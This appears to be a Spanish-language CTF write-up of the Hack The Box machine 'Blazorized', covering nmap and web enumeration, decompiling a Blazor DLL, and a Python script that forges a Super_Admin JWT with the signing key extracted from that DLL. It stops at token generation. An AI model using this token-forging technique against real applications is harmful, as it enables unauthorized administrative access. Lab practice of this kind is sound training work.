#ActiveDirectory #medium #windows 
### Ping

```python
ping -c 1 10.10.11.22
PING 10.10.11.22 (10.10.11.22) 56(84) bytes of data.
64 bytes from 10.10.11.22: icmp_seq=1 ttl=127 time=366 ms

--- 10.10.11.22 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 365.816/365.816/365.816/0.000 ms
```

### TTL = 127 - Windows

### nmap

```python
Not shown: 65514 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://blazorized.htb
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-05T02:37:01
|_Not valid after:  2054-07-05T02:37:01
|_ssl-date: 2024-07-05T02:41:11+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.22\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.22\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
3268/tcp  open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-05T02:37:01
|_Not valid after:  2054-07-05T02:37:01
|_ssl-date: 2024-07-05T02:41:11+00:00; -1s from scanner time.
| ms-sql-info: 
|   10.10.11.22:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 49776
| ms-sql-ntlm-info: 
|   10.10.11.22:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-05T02:41:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.66 seconds
```

### Enumeración del puerto 80 (http)
en la enumeración web podemos ver blazorized
![[Pasted image 20240704224625.png]]

`api`
al intentar enumerar la web en busca de subdominios podemos ver que al hacer clic en `Check for Updates` podemos ver que esta haciendo referencia a una `api` determinada
![[Pasted image 20240704225000.png]]

`/etc/hosts`
agregamos estas rutas a nuestro archivo `hosts` para poder enumerarlas
![[Pasted image 20240704225228.png]]

### XSS en blazorized
otra cosa que conseguí fue una `CVE` [XXS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown) he intentado esto pero no he podido conseguir mucha cosa. esperaba obtener una cookie o algo pero por el momento no tenemos nada
![[Pasted image 20240704225640.png]]

### Fuzzing con wfuzz
conseguí el subdominio de `admin` así que lo vamos a agregar el archivo `hosts` para seguir enumerando
![[Pasted image 20240704230120.png]]

### Enumeración del puerto 80 (http)
después de intentar un montón de cosas aquí no tenemos aun un vector claro
![[Pasted image 20240704230403.png]]

`Archivos DLL interesantes del marco Blazor`
Una cosa interesante de este sitio web fue la gran cantidad de archivos DLL. Después de un tiempo probando sttuf, decidí descargar algunas DLL para probar ingeniería inversa. 
![[Pasted image 20240704231037.png]]

`Descargué Blazorized.Helpers.dll desde` [aqui](http://blazorized.htb/_framework/Blazorized.Helpers.dll) 
![[Pasted image 20240704234037.png]]

### dnSpy
para este paso vamos a necesitar una maquina Windows ya que la herramienta dnSpy es para Windows. sin embargo existen maneras de usarla en Kali. puedes investigar esta opción
![[Pasted image 20240705003628.png]]

`Token`
con esta información podremos crear nuestro propio token para acceder como Administrador en blazorized. Puedes usar jwt.io, o en mi caso hice un script en Python:
![[Pasted image 20240705003707.png]]
![[Pasted image 20240705003826.png]]

### script
con este script usando la sintax que hemos obtenido del análisis de los DLL podemos generar un nuevo token
```python
import jwt
import datetime
import pytz

# Created by 3ky, enjoy :)
jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d"
issuer = "http://api.blazorized.htb"
apiAudience = "http://api.blazorized.htb"
adminDashboardAudience = "http://admin.blazorized.htb"
superAdminEmailClaimValue = "superadmin@blazorized.htb"
superAdminRoleClaimValue = "Super_Admin"

def get_signing_credentials() -> str:
    try:
        return jwtSymmetricSecurityKey
    except Exception as e:
        raise e

def generate_super_admin_jwt(expiration_duration_in_seconds: int = 60) -> str:
    try:
        claims = {
            "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": superAdminEmailClaimValue,
            "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": superAdminRoleClaimValue,
            "iss": issuer,
            "aud": adminDashboardAudience,
            "exp": datetime.datetime.now(pytz.utc) + datetime.timedelta(seconds=expiration_duration_in_seconds)
        }
        key = get_signing_credentials()
        jwt_token = jwt.encode(claims, key, algorithm="HS512")
        return jwt_token
    except Exception as e:
        raise e

if __name__ == "__main__":
    token = generate_super_admin_jwt()
    print(token)

```

`token`







### Vulnerabilidades

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad | Tipo | Nivel | Link |
| -------------- | --------------------------- | ---- | ----- | ---- |
|                |                             |      |       |      |
|                |                             |      |       |      |
|                |                             |      |       |      |
